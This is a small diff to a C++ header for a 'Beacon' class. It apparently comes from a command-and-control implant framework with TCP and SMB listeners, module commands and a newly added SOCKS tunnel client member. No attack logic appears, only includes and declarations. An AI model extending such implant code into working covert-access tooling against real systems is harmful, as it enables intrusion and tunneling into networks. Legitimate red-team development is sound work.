@@ -1,8 +1,5 @@
 #pragma once
 
-#include "../listener/ListenerTcp.hpp"
-#include "../listener/ListenerSmb.hpp"
-
 #ifdef __linux__
 #elif _WIN32
 #include <Windows.h>
@@ -13,7 +10,11 @@
 #include <queue>
 #include <mutex>
 
+#include "SocksTunnelClient.hpp"
 #include "Common.hpp"
+
+#include "../listener/ListenerTcp.hpp"
+#include "../listener/ListenerSmb.hpp"
 
 
 class Beacon
@@ -50,5 +51,6 @@ private:
 	std::string m_key;
 	std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
 	std::vector<std::unique_ptr<Listener>> m_listeners;
+	std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;
 
 };
